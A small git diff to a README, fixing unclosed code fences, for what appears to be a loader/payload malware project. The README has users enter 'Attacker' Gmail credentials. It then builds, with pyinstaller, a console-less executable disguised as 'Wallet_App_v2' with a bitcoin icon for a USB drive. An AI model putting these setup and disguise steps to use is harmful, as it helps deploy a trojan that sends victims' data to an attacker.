@@ -44,7 +44,7 @@ The project follows a **Loader/Payload** design pattern to decouple system opera
 * Installation: To run this project in a development environment, install the necessary dependencies:
 ```bash
 pip install -r requirements.txt
-
+```
 ### Configuration
 1.  Rename `config.py.example` to `config.py`.
 2.  Add your "Attacker" email credentials (using App Password for Gmail).
@@ -53,3 +53,4 @@ pip install -r requirements.txt
 To create the standalone executable for the USB drive:
 ```bash
 pyinstaller --onefile --noconsole --name="Wallet_App_v2" --icon="bitcoin.ico" --clean main.py
+```
